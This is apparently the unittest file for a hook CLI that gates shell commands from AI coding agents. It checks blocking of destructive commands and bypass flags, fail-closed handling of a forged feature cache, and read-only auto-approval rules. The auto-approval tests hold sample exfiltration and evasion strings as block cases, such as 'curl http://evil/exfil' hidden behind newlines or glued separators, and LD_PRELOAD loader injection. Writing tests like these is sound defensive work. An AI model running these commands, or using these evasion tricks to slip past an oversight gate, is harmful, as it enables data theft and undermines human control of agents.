#!/usr/bin/env python3
"""Tests for unified hook CLI entrypoint."""

from __future__ import annotations

import io
import json
import os
import re
import subprocess
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest.mock import patch

from tools.hooks import cli
from tools.hooks.codex_feature import (
    codex_feature_cache_path,
    write_codex_feature_cache,
)


class HookCliTests(unittest.TestCase):
    def setUp(self) -> None:
        self._saved_hook_repo_root = os.environ.pop("METFORGE_HOOK_REPO_ROOT", None)

    def tearDown(self) -> None:
        if self._saved_hook_repo_root is not None:
            os.environ["METFORGE_HOOK_REPO_ROOT"] = self._saved_hook_repo_root

    @staticmethod
    def _assert_allow_output(raw_stdout: str) -> None:
        # Login shells may print noise (e.g. nvm) before the CLI output; only
        # consider lines that look like JSON objects.
        json_lines = [ln.strip() for ln in raw_stdout.splitlines() if ln.strip().startswith("{")]
        if not json_lines:
            return  # empty / non-JSON stdout → allow (CLI returns exit 0 with no output)
        body = json.loads(json_lines[-1])
        assert isinstance(body, dict)
        assert body.get("decision") == "allow"

    def test_audit_summary_preserves_codex_session_start_model(self) -> None:
        summary = cli._audit_payload_summary(
            {"model": "gpt-5.6-sol", "session_id": "thread-123"}, None)
        self.assertEqual(summary["model"], "gpt-5.6-sol")
        self.assertEqual(summary["session_id"], "thread-123")

    def test_subprocess_command_works_with_module_entrypoint(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_subprocess_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METFORGE_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            env["METFORGE_HOOK_REPO_ROOT"] = tmp
            proc = subprocess.run(
                [
                    "python3",
                    "-m",
                    "tools.hooks.cli",
                    "--backend",
                    "codex",
                    "--event",
                    "PreToolUse",
                    "--input-json",
                    json.dumps(payload),
                ],
                cwd=str(repo_root),
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self._assert_allow_output(proc.stdout)

    def test_subprocess_command_works_from_subdirectory(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        subdir = repo_root / "tools"
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_subprocess_002",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METFORGE_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            cmd = (
                "ROOT=$(git rev-parse --show-toplevel); "
                "PYTHONPATH=\"$ROOT${PYTHONPATH:+:$PYTHONPATH}\" "
                f"METFORGE_HOOK_REPO_ROOT=\"{tmp}\" "
                f"python3 -m tools.hooks.cli --backend codex --event PreToolUse --repo-root \"{tmp}\""
            )
            proc = subprocess.run(
                ["sh", "-lc", cmd],
                cwd=str(subdir),
                env=env,
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self._assert_allow_output(proc.stdout)

    def test_hooks_json_command_works_from_subdirectory(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        # The LEAF wrapper, not `.codex/hooks.json` — which issue #102 made the DEV
        # layer. These two execute the committed command as a shell string to catch a
        # quoting / PYTHONPATH break in it, and the leaf's is the one that matters:
        # left pointing at the dev file they would have run `dev_cli`, which allows
        # everything and produces no stdout, so the allow assertion would have been
        # satisfied by a program that cannot refuse anything.
        hooks_doc = json.loads(
            (repo_root / "leaf_config" / "codex" / "hooks.json").read_text(encoding="utf-8"))
        self.assertIn("tools.hooks.cli",
                      hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"],
                      "this test executes the wrapper; pointed at the dev one it would be "
                      "satisfied by a program that allows everything")
        with tempfile.TemporaryDirectory() as tmp:
            command = (
                hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
                .replace(
                    'METFORGE_HOOK_REPO_ROOT="$ROOT"',
                    f'METFORGE_HOOK_REPO_ROOT="{tmp}"',
                )
                .replace('--repo-root "$ROOT"', f'--repo-root "{tmp}"')
            )
            payload = {
                "orchestration_id": "orch_subprocess_003",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METFORGE_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            proc = subprocess.run(
                command,
                cwd=str(repo_root / "tools"),
                env=env,
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                shell=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self._assert_allow_output(proc.stdout)

    def test_hooks_json_command_fail_fast_when_not_in_git_repo(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        # The LEAF wrapper, not `.codex/hooks.json` — which issue #102 made the DEV
        # layer. These two execute the committed command as a shell string to catch a
        # quoting / PYTHONPATH break in it, and the leaf's is the one that matters:
        # left pointing at the dev file they would have run `dev_cli`, which allows
        # everything and produces no stdout, so the allow assertion would have been
        # satisfied by a program that cannot refuse anything.
        hooks_doc = json.loads(
            (repo_root / "leaf_config" / "codex" / "hooks.json").read_text(encoding="utf-8"))
        self.assertIn("tools.hooks.cli",
                      hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"],
                      "this test executes the wrapper; pointed at the dev one it would be "
                      "satisfied by a program that allows everything")
        command = hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_subprocess_004",
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METFORGE_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            proc = subprocess.run(
                command,
                cwd=tmp,
                env=env,
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                shell=True,
                check=False,
            )
            self.assertNotEqual(proc.returncode, 0)

    def test_blocks_when_codex_hooks_feature_disabled(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (False, "hooks=false", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_disabled_002",
                    "repo_root": str(repo_root),
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 2)
                payload = json.loads(out.getvalue().strip())
                self.assertEqual(payload.get("decision"), "block")
                self.assertIn("hooks", payload.get("reason", ""))

    def test_feature_disabled_path_writes_audit_log(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (False, "hooks=false", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_disabled_001",
                    "repo_root": str(repo_root),
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 2)
                log_path = (
                    repo_root
                    / "workspace"
                    / "orchestrations"
                    / "orch_disabled_001"
                    / "hooks"
                    / "native_hook_events.jsonl"
                )
                self.assertTrue(log_path.is_file())

    def test_exception_path_writes_audit_log_when_payload_has_orchestration_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            payload = {
                "orchestration_id": "orch_exception_001",
                "repo_root": str(repo_root),
                "event_name": "NotAnEvent",
            }
            out = io.StringIO()
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 2)
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / "orch_exception_001"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertTrue(log_path.is_file())

    def test_blocks_dangerous_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_block_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "git reset --hard HEAD~1"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 2)
                body = json.loads(out.getvalue().strip())
                self.assertEqual(body.get("decision"), "block")

    def test_apply_patch_outside_workflow_still_applies_common_policy(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            payload = {
                "orchestration_id": "orch_apply_patch_common_policy_001",
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "command": "git reset --hard HEAD~1",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        "*** Add File: workspace/pipelines/safe/out.txt\n"
                        "+x\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "0", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("git reset --hard", body.get("reason", ""))

    def test_allows_non_dangerous_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_allow_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_dev_mode_blocks_verify_bypass_flags(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_dev_policy_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {
                        "command": (
                            "python3 tools/validate_pipeline_semantics.py --stage pre_judge "
                            "--allow-missing-orchestration"
                        )
                    },
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METFORGE_WORKFLOW_EXEC_MODE": "dev"}):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "codex",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 2)
                body = json.loads(out.getvalue().strip())
                self.assertEqual(body.get("decision"), "block")
                self.assertIn("dev mode forbids verify bypass flags", body.get("reason", ""))

    def test_unset_workflow_mode_defaults_to_dev_and_blocks_verify_bypass_flags(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_default_dev_policy_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {
                        "command": (
                            "python3 tools/validate_pipeline_semantics.py --stage pre_judge "
                            "--allow-missing-orchestration"
                        )
                    },
                }
                out = io.StringIO()
                with patch.dict(os.environ, {}, clear=True):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "codex",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 2)
                body = json.loads(out.getvalue().strip())
                self.assertEqual(body.get("decision"), "block")
                self.assertIn("dev mode forbids verify bypass flags", body.get("reason", ""))

    def test_prod_mode_allows_same_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_prod_policy_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {
                        "command": (
                            "python3 tools/validate_pipeline_semantics.py --stage pre_judge "
                            "--allow-missing-orchestration"
                        )
                    },
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METFORGE_WORKFLOW_EXEC_MODE": "prod"}):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "codex",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_writes_native_hook_audit_log_when_orchestration_id_is_provided(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_test_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                log_path = (
                    repo_root
                    / "workspace"
                    / "orchestrations"
                    / "orch_test_001"
                    / "hooks"
                    / "native_hook_events.jsonl"
                )
                self.assertTrue(log_path.is_file())
                entry = json.loads(log_path.read_text(encoding="utf-8").strip())
                self.assertEqual(entry.get("backend"), "codex")
                self.assertEqual(entry.get("event"), "pre_command_execute")

    @staticmethod
    def _run_codex_pre(payload: dict) -> int:
        with redirect_stdout(io.StringIO()):
            return cli.main(
                ["--backend", "codex", "--event", "PreToolUse",
                 "--input-json", json.dumps(payload)]
            )

    def test_codex_gate_reads_host_seeded_cache_without_probing(self) -> None:
        # The hook reads the host-written cache (orchestration-dir root, RO in-sandbox)
        # and never probes codex itself. A real on-disk enabled=true → allow.
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            write_codex_feature_cache(
                repo_root=repo_root, orchestration_id="orch_seed_ok",
                enabled=True, detail="hooks=true", status_kind="ok")
            payload = {
                "orchestration_id": "orch_seed_ok",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            # the probe must never be invoked by the hook
            with patch("tools.hooks.codex_feature.codex_hooks_feature_enabled",
                       side_effect=AssertionError("hook must not probe codex")):
                self.assertEqual(self._run_codex_pre(payload), 0)

    def test_codex_gate_fail_closed_on_host_seeded_disabled(self) -> None:
        # Real on-disk cache that the host wrote with enabled=false (feature off / probe
        # error) → fail closed, via the real read path (no mock).
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            write_codex_feature_cache(
                repo_root=repo_root, orchestration_id="orch_seed_off",
                enabled=False, detail="hooks=false", status_kind="ok")
            payload = {
                "orchestration_id": "orch_seed_off",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)

    def test_codex_gate_fail_closed_when_cache_missing(self) -> None:
        # No host-written cache → fail closed (the host did not certify the feature).
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_no_cache",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)

    def test_codex_gate_ignores_forged_legacy_hooks_path(self) -> None:
        # Security regression: the OLD location was the leaf-writable hooks/ dir. A leaf
        # forging enabled=true THERE must NOT be honored — the hook reads only the new
        # RO orchestration-dir-root path, which here is absent → fail closed.
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            legacy = (repo_root / "workspace" / "orchestrations" / "orch_forge"
                      / "hooks" / "codex_feature_check.json")
            legacy.parent.mkdir(parents=True, exist_ok=True)
            legacy.write_text(json.dumps(
                {"enabled": True, "detail": "hooks=true", "status_kind": "ok",
                 "checked_at": "2026-01-01T00:00:00Z"}), encoding="utf-8")
            payload = {
                "orchestration_id": "orch_forge",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)
            # the new RO path must be where the real cache lives, NOT under hooks/
            real = codex_feature_cache_path(repo_root=repo_root, orchestration_id="orch_forge")
            self.assertNotIn("/hooks/", str(real))
            self.assertFalse(real.is_file())

    def test_codex_gate_fail_closed_on_malformed_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            path = codex_feature_cache_path(repo_root=repo_root, orchestration_id="orch_bad")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps({"enabled": "yes-please"}), encoding="utf-8")
            payload = {
                "orchestration_id": "orch_bad",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)


class ClaudeHookCliTests(unittest.TestCase):
    def setUp(self) -> None:
        self._saved_hook_repo_root = os.environ.pop("METFORGE_HOOK_REPO_ROOT", None)

    def tearDown(self) -> None:
        if self._saved_hook_repo_root is not None:
            os.environ["METFORGE_HOOK_REPO_ROOT"] = self._saved_hook_repo_root

    def test_claude_backend_allows_safe_command(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_claude_allow_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METFORGE_HOOK_REPO_ROOT"] = tmp
            proc = subprocess.run(
                [
                    "python3",
                    "-m",
                    "tools.hooks.cli",
                    "--backend",
                    "claude",
                    "--event",
                    "PreToolUse",
                    "--input-json",
                    json.dumps(payload),
                ],
                cwd=str(repo_root),
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self.assertEqual(proc.stdout.strip(), "")

    def test_claude_backend_blocks_git_reset_hard(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_claude_block_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "git reset --hard HEAD~1"},
            }
            env = os.environ.copy()
            env["METFORGE_HOOK_REPO_ROOT"] = tmp
            proc = subprocess.run(
                [
                    "python3",
                    "-m",
                    "tools.hooks.cli",
                    "--backend",
                    "claude",
                    "--event",
                    "PreToolUse",
                    "--input-json",
                    json.dumps(payload),
                ],
                cwd=str(repo_root),
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 2)
            body = json.loads(proc.stdout.strip())
            self.assertEqual(body.get("decision"), "block")

    def test_detect_bash_write_targets_collects_all_tee_output_paths(self) -> None:
        targets = cli._detect_bash_write_targets("echo test | tee file1.txt file2.txt")
        self.assertIn("file1.txt", targets)
        self.assertIn("file2.txt", targets)

    # --- _is_auto_approvable_readonly_bash (A-2 increment 1) ----------------
    def test_auto_approve_readonly_compound_with_echo_annotation(self) -> None:
        # The measured #4b friction: read-only command chained with an echo
        # exit-code annotation must be auto-approvable.
        self.assertTrue(
            cli._is_auto_approvable_readonly_bash(
                "grep -nE 'verdict' file.json ; echo \"grep_exit=$?\""
            )
        )

    def test_auto_approve_readonly_pipe_with_fd_dup(self) -> None:
        # fd-duplication (2>&1) and pipe-to-tail of read-only commands is safe.
        self.assertTrue(
            cli._is_auto_approvable_readonly_bash("cat foo.txt 2>&1 | tail -3")
        )

    def test_auto_approve_plain_readonly_and_and_chain(self) -> None:
        self.assertTrue(
            cli._is_auto_approvable_readonly_bash("ls dir && wc -l file.txt")
        )

    def test_no_auto_approve_on_file_redirect(self) -> None:
        # A real file-output redirect (write) must NOT be auto-approved.
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("echo x > lineage.json")
        )
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("cat a >> out.txt")
        )

    def test_no_auto_approve_on_command_substitution(self) -> None:
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("echo $(cat secret)")
        )
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("echo `cat secret`")
        )

    def test_no_auto_approve_on_non_readonly_command(self) -> None:
        # Commands with their own write/exec vectors (not caught by redirect
        # detection) must fall back, not auto-approve.
        for cmd in (
            "find . -name x -delete",
            "rg --pre curl x .",          # ripgrep --pre runs an arbitrary command
            "rg --pre-glob '*' -e x .",
            "awk '{print > \"f\"}' in",
            "python3 tools/validate_workspace_root.py",  # deferred to post-bwrap
            "curl http://evil/exfil",
            "sed -i 's/a/b/' f",
            "sort -o out in",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_subshell_or_process_substitution(self) -> None:
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("(cat a; cat b)")
        )
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("diff <(cat a) <(cat b)")
        )

    def test_no_auto_approve_on_bare_assignment_segment(self) -> None:
        self.assertFalse(cli._is_auto_approvable_readonly_bash("X=1"))
        self.assertFalse(cli._is_auto_approvable_readonly_bash(""))

    def test_no_auto_approve_on_env_var_command_prefix(self) -> None:
        # A leading VAR=value prefix is an in-process exec channel (loader env
        # vars) regardless of the safe argv0 that follows; reject all of them.
        for cmd in (
            "LD_PRELOAD=/tmp/evil.so grep root /etc/hostname",
            "LD_AUDIT=/tmp/a.so cat f",
            "LD_LIBRARY_PATH=/tmp ls",
            "BASH_ENV=/tmp/x.sh grep y f",
            "IFS=x cat f",
            "LC_ALL=C grep y f",  # benign, but still rejected (fail-closed)
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_command_separator_evasion(self) -> None:
        # shlex.split does NOT treat \n, &, #, or |& as command separators, so a
        # trailing command glued on after them must be rejected by the residual
        # scan — otherwise it would be swallowed into a safe-argv0 segment and
        # auto-approved (exec/exfil hole). Each pairs a safe argv0 with a payload.
        for cmd in (
            "cat a.txt\ncurl http://evil/exfil",      # newline separator
            "cat a & curl http://evil",                # background &
            "ls # comment\ncurl http://evil",          # comment then newline
            "ls\npython3 -c 'import os'",               # newline then interpreter
            "cat a |& curl http://evil",               # |& stderr-pipe
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_glued_separators(self) -> None:
        # shlex.split keeps a separator glued to a word inside one token
        # (`cat a;curl x` -> ['cat','a;curl','x']); segmentation must come from
        # splitting the quote-stripped string, not the token list, or the
        # trailing command escapes the argv0 check (exec / network exfil).
        for cmd in (
            "cat a;curl http://evil",                       # glued ;
            "cat a|sh",                                      # glued | into shell
            "cat a| sh",
            "echo hi; bash -c id",                           # spaced ; into bash
            "echo data;sh",
            "cat a&&curl http://evil",                       # glued &&
            "cat a|| curl http://evil",                      # glued ||
            "cat a;curl http://x -o /tmp/y",                 # curl -o write (no shell redirect)
            'cat a;sh -c "echo x>/tmp/p"',                   # quoted redirect + exec
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_fd_dup_lookalike_file_redirect(self) -> None:
        # `>&name` (non-numeric RHS) is a file redirect, not fd-duplication; it
        # must not be stripped as fd-dup and auto-approved.
        self.assertFalse(cli._is_auto_approvable_readonly_bash("cat a >&out.txt"))

    def test_no_auto_approve_on_digit_prefixed_redirect_filename(self) -> None:
        # `n>&Ddigits-then-filename` (e.g. 1>&9secret) is a FILE redirect in bash;
        # the fd-dup strip must not eat the `1>&9` prefix and leave `secret` inert.
        for cmd in (
            "cat /etc/hostname 1>&9secret",
            "ls 2>&1foo",
            "ls 0>&1bar",
            "cat a 2>&3baz",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_auto_approve_still_allows_multidigit_fd_dup(self) -> None:
        # Genuine fd-duplication with all-digit RHS still strips and passes.
        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a 1>&12"))
        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a 2>&1 | head"))

    def test_auto_approve_still_allows_real_fd_dup(self) -> None:
        # Regression guard for the tightened _FD_DUP_RE / control-op blanking:
        # genuine fd-duplication and the allowed control operators still pass.
        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a >&2"))
        self.assertTrue(cli._is_auto_approvable_readonly_bash("ls a && ls b || ls c"))

    def test_detect_bash_write_targets_detects_sed_inplace_without_space_after_i(self) -> None:
        targets = cli._detect_bash_write_targets("sed -i's/a/b/' file.txt")
        self.assertIn("file.txt", targets)

    def test_detect_bash_write_targets_detects_sed_inplace_when_i_comes_after_script(self) -> None:
        targets = cli._detect_bash_write_targets("sed -e 's/a/b/' -i file.txt")
        self.assertIn("file.txt", targets)

    def test_detect_bash_write_targets_ignores_redirect_inside_double_quoted_arg(self) -> None:
        # --reply-text "... > 0 ..." must NOT be treated as a redirect to "0"
        cmd = 'python3 tools/orchestration_runtime.py record-reply --reply-text "verification_status=fail. exit code > 0"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_ignores_redirect_inside_single_quoted_arg(self) -> None:
        cmd = "python3 tools/orchestration_runtime.py record-reply --reply-text 'status > 0, see log'"
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_still_detects_real_redirect_outside_quotes(self) -> None:
        cmd = 'python3 foo.py --arg "inner > ignored" > workspace/out.txt'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/out.txt", targets)
        self.assertNotIn("ignored", targets)

    def test_detect_bash_write_targets_ignores_tee_inside_quoted_arg(self) -> None:
        cmd = 'python3 foo.py --reply-text "pipe | tee tmpfile"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_tee_with_quoted_path_detects_target(self) -> None:
        # tee outside quotes but its path argument is quoted: must detect the real path, not whitespace
        cmd = 'python3 foo.py 2>&1 | tee "output.log"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("output.log", targets)
        self.assertFalse(any(not t.strip() for t in targets))

    def test_detect_bash_write_targets_redirect_inside_command_substitution_in_quoted_arg(self) -> None:
        # "$(echo hi > workspace/forbidden.txt)" — $() executes even inside double quotes
        cmd = 'python3 foo.py --arg "$(echo hi > workspace/forbidden.txt)"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/forbidden.txt", targets)

    def test_detect_bash_write_targets_backtick_substitution_inside_quoted_arg(self) -> None:
        cmd = 'python3 foo.py --arg "`echo hi > workspace/out.txt`"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/out.txt", targets)

    def test_detect_bash_write_targets_nested_command_substitution(self) -> None:
        # Nested $(): both inner and outer redirects should be caught
        cmd = 'python3 foo.py "$(echo $(ls > /tmp/a) > /tmp/b)"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/a", targets)
        self.assertIn("/tmp/b", targets)

    def test_detect_bash_write_targets_single_quoted_paren_inside_subshell(self) -> None:
        # '(' inside $() must not inflate depth and cause the body to be dropped
        cmd = """python3 foo.py --arg "$(printf '('; echo hi > /tmp/pwn)" """
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/pwn", targets)

    def test_detect_bash_write_targets_escaped_paren_inside_subshell(self) -> None:
        cmd = r'python3 foo.py --arg "$(printf \(; echo hi > /tmp/pwn)"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/pwn", targets)

    def test_detect_bash_write_targets_literal_redirect_in_quoted_string_not_detected(self) -> None:
        # Plain quoted text with > is not a redirect and must not be flagged
        cmd = 'python3 foo.py --reply-text "exit code > 0"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_arithmetic_expansion_not_flagged(self) -> None:
        # $((1 > 0)) is arithmetic — '>' is comparison, not a redirect
        cmd = 'python3 foo.py --reply-text "$((1 > 0))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_arithmetic_with_nested_parens_not_flagged(self) -> None:
        cmd = 'python3 foo.py --val "$(( (a + b) > 0 ))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_arithmetic_plus_real_redirect(self) -> None:
